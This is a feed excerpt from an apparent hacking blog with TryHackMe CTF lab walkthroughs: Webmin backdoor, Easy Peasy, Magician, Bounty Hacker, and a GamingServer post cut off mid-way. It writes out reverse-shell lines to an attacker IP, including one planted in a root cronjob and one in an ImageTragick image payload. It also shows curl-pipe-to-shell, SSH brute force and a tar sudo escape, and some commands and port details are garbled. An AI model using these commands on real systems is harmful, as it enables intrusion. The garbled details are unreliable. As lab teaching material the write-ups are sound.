+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 1000/tcp HTTP</code></strong>.</p>
+
+<p>I am visiting the Webmin page running on port 1000. I see a page like this:</p>
+
+<p><img src="/assets/img/tryhackme/source/home.png" alt="home" /></p>
+
+<p>I fix the URL as HTTP like this <a href="https://10.10.11.143:10000/">https://10.10.11.143:10000/</a></p>
+
+<p>The Webmin login page appears on the page.</p>
+
+<p><img src="/assets/img/tryhackme/source/login.png" alt="login" /></p>
+
+<p>I tried several login attempts but it didn’t work. I’m searching for any security vulnerabilities in the version of Webmin used.</p>
+
+<p><img src="/assets/img/tryhackme/source/browse.png" alt="browse" /></p>
+
+<p>I see that this version of Webmin is vulnerable.</p>
+
+<p>I decide to do a search using Metasploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+$ search webmin
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/search.png" alt="search" /></p>
+
+<p>I’ve tried most of the ones here. I can only run <strong><code class="language-plaintext highlighter-rouge">7 exploit/linux/http/webmin_backdoor</code></strong>.</p>
+
+<p>Let’s do the settings first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ set RHOSTS 10.10.11.143
+$ set LHOST 10.8.86.168
+$ set SSL true
+$ show options
+</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/source/set.png" alt="set" /></p>
+
+<p>After making the settings, it should look like this.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ show options
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/options.png" alt="options" /></p>
+
+<p>Let’s run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ run
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/run.png" alt="run" /></p>
+
+<p>Yes, it worked. We are inside with root privilege.</p>
+
+<p>Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-roottxt">1.2 root.txt</h3>
+
+<p>Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="easy, ctf, cve" /><summary type="html"><![CDATA[Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/source.png" /><media:content medium="image" url="http://localhost:4000/assets/img/source.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
+
+<p>Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-enumeration-through-nmap">1. Enumeration through Nmap</h2>
+
+<p>Deploy the machine attached to this task and use nmap to enumerate it.</p>
+
+<p><br /></p>
+
+<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.46.132 -p-
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nmap.png" alt="nmap" /></p>
+
+<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">80/tcp HTTP, 6498/tcp SSH, and 65524/tcp HTTP</code></strong>.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 3</code></strong></p>
+
+<p><br /></p>
+<h3 id="12-what-is-the-version-of-nginx">1.2 What is the version of nginx?</h3>
+
+<p>Look carefully at port 80.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nginx.png" alt="nginx" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 1.16.1</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="13-what-is-running-on-the-highest-port">1.3 What is running on the highest port?</h3>
+
+<p>The highest port is 65524.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache.png" alt="apache" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: apache</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h3 id="2-compromising-the-machine">2 Compromising the machine</h3>
+
+<p>Now you’ve enumerated the machine, answer questions and compromise it!</p>
+
+<p><br /></p>
+
+<h3 id="21-using-gobuster-find-flag-1">2.1 Using GoBuster, find flag 1.</h3>
+
+<p>I’m visiting the site running on port 80 and I see such a page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/first-home.png" alt="first-home" /></p>
+
+<p>I checked the source page but couldn’t find anything remarkable.</p>
+
+<p>Let’s do a gobuster scan and see if we can find anything.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  gobuster dir -u http://10.10.46.132/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/gobuster-one.png" alt="gobuster-one" /></p>
+
+<p>We found /hidden the directory. I’ve been looking through the page but couldn’t find any flags. I’m scanning this directory with gobuster.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.46.132/hidden/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/whatever.png" alt="whatever" /></p>
+
+<p>Nothing appears on the page. Let’s look at the source page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/decode.png" alt="decode" /></p>
+
+<p>I see an encrypted text. It looks like base64 code. Let’s crack it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "ZmxhZZ3tmMXJzN19mbDRnfQ==" | base64 -d
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/encode.png" alt="encode" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*********}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="22-further-enumerate-the-machine-what-is-flag-2">2.2 Further enumerate the machine, what is flag 2?</h3>
+
+<p>For the second flag, we’ll jump to the other web service running on port 65524/tcp. There is a robots.txt file that discloses a hash.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/robots.png" alt="robots" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">a18672860d0510e5ab6699730763b250</code></strong></p>
+
+<p>Let’s look at the type of hash with hash-identifer.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/id-robots.png" alt="id-robots" /></p>
+
+<p>We found the type MD5. Let’s crack it.</p>
+
+<p>I found a site that can crack it online. <a href="https://md5hashing.net/hash">Here</a></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cracking-robots.png" alt="cracking-robots" /></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-robots.png" alt="crack-robots" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{********}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="23-crack-the-hash-with-easypeasytxt-what-is-the-flag-3">2.3 Crack the hash with easypeasy.txt, What is the flag 3?</h3>
+
+<p>When we take a look at Apache, something remarkable emerges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/flag3.png" alt="flag3" /></p>
+
+<p>let’s crack it :9fdafbd64c47471a8f54cd3fc64cd312</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-flag3.png" alt="crack-flag3" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*************************}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="24-what-is-the-hidden-directory">2.4 What is the hidden directory?</h3>
+
+<p>When we go to the source page of the Apache page, we see something like this.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache-source.png" alt="apache-source" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;</code></p>
+
+<p>Encrypted using bas62. Let’s decrypt using <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a>.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-one.png" alt="crack-one" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: /n0th1ng3ls3m4tt3r</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="25-using-the-wordlist-that-provided-to-you-in-this-task-crack-the-hash">2.5 Using the wordlist that provided to you in this task crack the hash</h3>
+<p>what is the password?</p>
+
+<p><em>Hint: GOST Hash john –wordlist=easypeasy.txt –format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)</em></p>
+
+<p>Let’s go to <a href="http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/">http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/</a> . Here is the page that comes up.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/find-dict.png" alt="find-dict" /></p>
+
+<p>Let’s check the source of the page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>
+
+<p>We found this hash.. <code class="language-plaintext highlighter-rouge">940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p>
+
+<p>First I look at the type with hash-identifier.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-id.png" alt="dict-source-id" /></p>
+
+<p>It looks like it was encrypted with Sha-256 but when I tried to crack it it didn’t. Let’s crack it starting from the clue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=easypeasy.txt --format=gost hash.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-crack.png" alt="dict-source-crack" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: **********</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="26-what-is-the-password-to-login-to-the-machine-via-ssh">2.6 What is the password to login to the machine via SSH?</h3>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>
+
+<p>Let’s download the picture on the page and see. <strong><code class="language-plaintext highlighter-rouge">binarycodepixabay.jpg</code></strong></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/pixabay.png" alt="pixabay" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+$ steghide extract -sf binarycodepixabay.jpg
+$ cat secrettext.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secrettext.png" alt="secrettext" /></p>
+
+<p>We found the username and password.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Username: boring</code></strong></p>
+
+<p>Let’s crack the encrypted password first.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-pixabay.png" alt="crack-pixabay" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: iconvertedmypasswordtobinary</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="27-what-is-the-user-flag">2.7 What is the user flag?</h3>
+
+<p>Let’s do ssh login. Remember ssh is running on port 6498.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i boring@10.10.120.186 -p- 6498
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/sshin.png" alt="sshin" /></p>
+
+<p>And we are inside. Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/user-flag.png" alt="user-flag" /></p>
+
+<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{***********}</code></strong>. Let’s crack it.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/rot.png" alt="rot" /></p>
+
+<p><br /></p>
+
+<h3 id="28-what-is-the-root-flag">2.8 What is the root flag?</h3>
+
+<p>We need root privilege . I try <code class="language-plaintext highlighter-rouge">sudo l</code> first but it doesn’t work. Then I check the cron job.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cron.png" alt="cron" /></p>
+
+<p>We found something useful here. Let’s go to the file and do a reverse-shell.</p>
+
+<p>First, let’s set up a netcat listener on our own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Let’s change the file on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano /var/www/.mysecretcronjob.sh
+#!/bin/bash
+# i will run as root
+bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secretjob.png" alt="secretjob" /></p>
+
+<p>After waiting for a while, we get root privileges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-in.png" alt="root-in" /></p>
+
+<p>Yes, we have root privileges. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Magician</title><link href="http://localhost:4000/tryhackme-magician/" rel="alternate" type="text/html" title="TryHackMe - Magician" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-magician</id><content type="html" xml:base="http://localhost:4000/tryhackme-magician/"><![CDATA[<p>This magical website lets you convert image file formats. Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-find-the-flags">1. Find the flags!</h2>
+
+<p>Note: this machine needs about 7 minutes to start up, please be patient :)</p>
+
+<p>Please add the IP address of this machine with the hostname “magician” to your /etc/hosts file on Linux before you start.
+On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.</p>
+
+<p>Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)</p>
+
+<p>Have fun and use your magic skills!</p>
+
+<p><br /></p>
+
+<h3 id="11-usertxt">1.1 user.txt</h3>
+
+<p>Let’s first add the hostname to our /etc/hosts file, as told above.</p>
+
+<p><img src="/assets/img/tryhackme/magician/hosts.png" alt="hosts" /></p>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV magician
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/magician/nmap.png" alt="nmap" /></p>
+
+<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">21/tcp HTTP, 8080/tcp SSH, and 8081/tcp HTTP</code></strong>.</p>
+
+<p>First, I tried to see if I could login to the FTP server anonymously.</p>
+
+<p><img src="/assets/img/tryhackme/magician/ftp.png" alt="ftp" /></p>
+
+<p>I found an important clue here. 
+This is what I came across when I visited this site: <a href="https://imagetragick.com">https://imagetragick.com</a>.</p>
+
+<p><img src="/assets/img/tryhackme/magician/hint.png" alt="hint" /></p>
+
+<p>We will exploit a vulnerability using <strong><code class="language-plaintext highlighter-rouge">CVE-2016–3714</code></strong>.</p>
+
+<p>Now let’s check the websites running on other ports.</p>
+
+<p>First I examine the site running on port 8080.</p>
+
+<p><img src="/assets/img/tryhackme/magician/8080.png" alt="8080" /></p>
+
+<p>I couldn’t find anything remarkable.</p>
+
+<p>Now let’s examine the site running on port 8081.</p>
+
+<p><img src="/assets/img/tryhackme/magician/home.png" alt="home" /></p>
+
+<p>As far as I can see, I can only upload images. Let’s create a reverse shell by taking advantage of the CVE-2016–3714 vulnerability we found.</p>
+
+<p><img src="/assets/img/tryhackme/magician/image.png" alt="image" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &gt; image.png &lt;&lt; EOF
+  push graphic-context
+  encoding "UTF-8"
+  viewbox 0 0 1 1
+  affine 1 0 0 1 0 0 
+  push graphic-context
+  image Over 0,0 1,1 '|/bin/bash -i &gt; /dev/tcp/10.8.86.168/4444 0&lt;&amp;1 2&gt;&amp;1'
+  pop graphic-context
+  pop graphic-context
+  EOF
+</code></pre></div></div>
+
+<p>Now let’s set up a netcat listener on our machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Now we can upload it to the site.</p>
+
+<p><img src="/assets/img/tryhackme/magician/in.png" alt="in" /></p>
+
+<p>And we are inside.</p>
+
+<p>Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/magician/user-flag.png" alt="user-flag" /></p>
+
+<h3 id="12-roottxt">1.2 root.txt</h3>
+
+<p>Now we need root privilege. So let’s download linepeas.sh and run it.</p>
+
+<p>I’m downloading <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> on my own machine.</p>
+
+<p>Let’s run the following code in the directory where linpeas.sh is located.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -m http.server 80
+</code></pre></div></div>
+
+<p>Then let’s run the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh
+</code></pre></div></div>
+
+<p>And it worked. Let’s see what we can find.</p>
+
+<p>I found this.</p>
+
+<p><img src="/assets/img/tryhackme/magician/linpeas.png" alt="linpeas" /></p>
+
+<p>There is something running on port 6666. To achieve this, we need to do port forwarding.</p>
+
+<p>First, let’s download the <a href="https://github.com/jpillora/chisel/releases">chisel</a> to our own machine and send it to the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_arm64.gz
+$ gunzip chisel_1.8.1_linux_arm64.gz  
+$ mv chisel_1.8.1_linux_arm64 chisel
+$ python -m http.server 80
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/magician/chisel.png" alt="chisel" /></p>
+
+<p>On the target machine, we run the following codes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.8.86.168/chisel
+$ chmod +x chisel
+$ ./chisel client 10.8.86.168:5555 R:5554:127.0.0.1:6666
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/magician/chisel-target.png" alt="chisel-target" /></p>
+
+<p>Then ı return to my own machine and run the following codes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo apt-get install chisel
+$ chisel server --reverse --port 5555
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/magician/chisel-own.png" alt="chisel-own" /></p>
+
+<p>Now we can look at the site running on the port we forwarded. <a href="http://0.0.0.0:5554">http://0.0.0.0:5554</a></p>
+
+<p><img src="/assets/img/tryhackme/magician/run.png" alt="run" /></p>
+
+<p>We are looking for /root/root.txt. Press the Submit button until the base64 code is displayed.</p>
+
+<p><img src="/assets/img/tryhackme/magician/encode.png" alt="encode" /></p>
+
+<p>Let’s crack it.</p>
+
+<p><img src="/assets/img/tryhackme/magician/decode.png" alt="decode" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="CVE-2016-3714" /><summary type="html"><![CDATA[This magical website lets you convert image file formats. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/magician.png" /><media:content medium="image" url="http://localhost:4000/assets/img/magician.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Bounty Hacker</title><link href="http://localhost:4000/tryhackme-bounty-hacker/" rel="alternate" type="text/html" title="TryHackMe - Bounty Hacker" /><published>2023-03-23T00:00:00+03:00</published><updated>2023-03-23T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-bounty-hacker</id><content type="html" xml:base="http://localhost:4000/tryhackme-bounty-hacker/"><![CDATA[<p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.</p>
+
+<p>Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-living-up-to-the-title">1. Living up to the title.</h2>
+
+<p>You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they’d take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers &amp; beef in your future!</p>
+
+<p><br /></p>
+
+<h3 id="11-deploy-the-machine">1.1 Deploy the machine.</h3>
+
+<h3 id="12-find-open-ports-on-the-machine">1.2 Find open ports on the machine</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.80.114
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/nmap.png" alt="nmap" /></p>
+
+<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">21/tcp FTP, 22/tcp SSH, and 80/tcp HTTP</code></strong>.</p>
+
+<p>But first, let’s check the website running on port 80. 
+Here is a page like this.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/home.png" alt="home" /></p>
+
+<p>I’ve been browsing this site  but haven’t found anything remarkable.</p>
+
+<p>We don’t have anything on website . Let’s run a gobuster scan and see what we can find. 
+I couldn’t find anything.</p>
+
+<h3 id="13-who-wrote-the-task-list">1.3 Who wrote the task list?</h3>
+
+<p>We see anonymous FTP login is allowed. So we login to the FTP server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ftp anonymous@10.10.231.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/ftp.png" alt="ftp" /></p>
+
+<p>We see two files here. One of them is <strong><code class="language-plaintext highlighter-rouge">locks.txt</code></strong> and the other is <strong><code class="language-plaintext highlighter-rouge">task.txt</code></strong>. Let’s get this file on our machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ get locks.txt
+$ get task.txt
+</code></pre></div></div>
+
+<p>Let’s take a look at what is inside these files.</p>
+
+<p>locks.txt : This file is a password list.</p>
+
+<ul>
+  <li><img src="/assets/img/tryhackme/bounty-hacker/locks.png" alt="locks" /></li>
+</ul>
+
+<p>task.txt : This file is Lin’s notes.</p>
+
+<ul>
+  <li><img src="/assets/img/tryhackme/bounty-hacker/task.png" alt="task" /></li>
+</ul>
+
+<p>Now, we have a username and list of passwords that we can use to ssh brute force.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: lin</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="14-what-service-can-you-bruteforce-with-the-text-file-found">1.4 What service can you bruteforce with the text file found?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: ssh</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="15-what-is-the-users-password">1.5 What is the users password?</h3>
+
+<p>Let’s do ssh brute force.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ hydra -l lin -P locks.txt 10.10.231.70 -t 4 ssh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/hydra.png" alt="hydra" /></p>
+
+<p><br /></p>
+
+<h3 id="16-usertxt">1.6 user.txt</h3>
+
+<p>We found Lin’s ssh password. Let’s login to ssh.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh lin@10.10.231.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/sshin.png" alt="sshin" /></p>
+
+<p>Now we can reach the user flag. Let’s get it.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="16-roottxt">1.6 root.txt</h3>
+
+<p>Now, we need privilege escalation. So, I try the first <strong><code class="language-plaintext highlighter-rouge">sudo -l</code></strong> command. I entered the password and here it is.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/sudo.png" alt="sudo" /></p>
+
+<p>As far as I can see, we can get root privileges using tar. I’m looking at <a href="https://gtfobins.github.io/gtfobins/tar/">gtfobins</a>. and we found this.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/gtfobins.png" alt="gtfobins" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh 
+</code></pre></div></div>
+
+<p>And we got root privilege. Now we can get to the root flag. Let’s get it.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="linux," /><category term="tar," /><category term="privesc" /><summary type="html"><![CDATA[You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - GamingServer</title><link href="http://localhost:4000/tryhackme-gamingserver/" rel="alternate" type="text/html" title="TryHackMe - GamingServer" /><published>2023-03-21T00:00:00+03:00</published><updated>2023-03-21T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gamingserver</id><content type="html" xml:base="http://localhost:4000/tryhackme-gamingserver/"><![CDATA[<p>An Easy Boot2Root box for beginners. Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-gaming-server">1. Gaming Server</h2>
+
+<p>Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.</p>
+
+<p><br /></p>
+
+<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.80.114
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/gamingserver/nmap.png" alt="nmap" /></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH, and 80/tcp HTTP</code></strong>. 
+But first, let’s check the website running on port 80. 
+Here is a page like this.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/home.png" alt="home" /></p>
+
+<p>I’ve been browsing through other links on the site but haven’t found anything remarkable. Let’s take a look at the source of the page.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/source.png" alt="source" /></p>
+
+<p>We found a name here, maybe we can use it for ssh.</p>
+
+<p>We don’t have anything else. Let’s run a gobuster scan and see what we can find.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.225.113  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/gamingserver/gobuster.png" alt="gobuster" /></p>
+
+<p>We discovered two directories. Let’s see what we can find in these directories.</p>
+
+<p>First I go to the /uploads/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/gamingserver/uploads.png" alt="uploads" /></p>
+
+<p>As you can see, there are 3 files.</p>
+
+<p>dict.lst : It looks like a password list. We can try ssh brute force for John.</p>
+
+<ul>
+  <li><img src="/assets/img/tryhackme/gamingserver/dict.png" alt="dict" /></li>
+</ul>
+
+<p>Manifesto.txt : Something like a poem or song. Nothing noteworthy.</p>
+
+<ul>
